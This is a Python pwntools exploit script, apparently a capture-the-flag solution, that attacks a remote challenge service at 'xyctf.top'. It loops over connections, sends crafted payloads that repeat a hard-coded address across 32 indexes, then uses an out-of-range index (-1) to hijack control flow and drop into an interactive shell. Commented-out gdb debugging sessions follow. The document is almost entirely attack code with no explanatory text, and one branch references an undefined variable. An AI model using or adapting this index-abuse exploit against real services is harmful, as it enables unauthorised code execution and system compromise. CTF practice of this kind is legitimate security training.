from pwn import*
context.update(arch='amd64',os='linux',log_level='debug')
context.terminal = ["qterminal", "-e"]
addr=p64(0x0401328)
while(1):
    try:
        #p=process('./pwn')
        p=remote('xyctf.top',37436)
        for i in range(32):    
            p.recvuntil('index')
            sleep(0.1)
            p.sendline(str(i))
            p.recvuntil('name:')
            p.send(addr+addr)
            sleep(0.1)
            p.recvuntil('id:')
            p.sendline(b'1')  
        p.recvuntil('index')
        sleep(0.1)
        p.sendline(str(32))
        p.recvuntil('name:')
        p.send(addr+addr)
        sleep(0.1)
        p.recvuntil('id:')
        p.sendline(b'48')
        p.recvuntil('index')
        sleep(0.1)
        p.sendline(str(-1))
        sleep(0.1)
        p.interactive()
        if b"find" not in des:
            p.close()
        else:
            p.interactive()
    except:
        log.info("mbot")
        p.close()

'''

p=process('./pwn')
gdb.attach(p,'b* 0x401373')
for i in range(32):    
    p.recvuntil('index')
    sleep(0.1)
    p.sendline(str(i))
    p.recvuntil('name:')
    p.send(addr+addr)
    sleep(0.1)
    p.recvuntil('id:')
    p.sendline(b'1')
p.interactive()
pause()
'''

'''
p=process('./pwn')
gdb.attach(p,'b* 0x401275')
p.recvuntil('index')
sleep(0.1)
p.sendline(str(32))
p.recvuntil('name:')
p.send(addr+addr)
sleep(0.1)
p.recvuntil('id:')
#8x
#0
p.interactive()
pause()
'''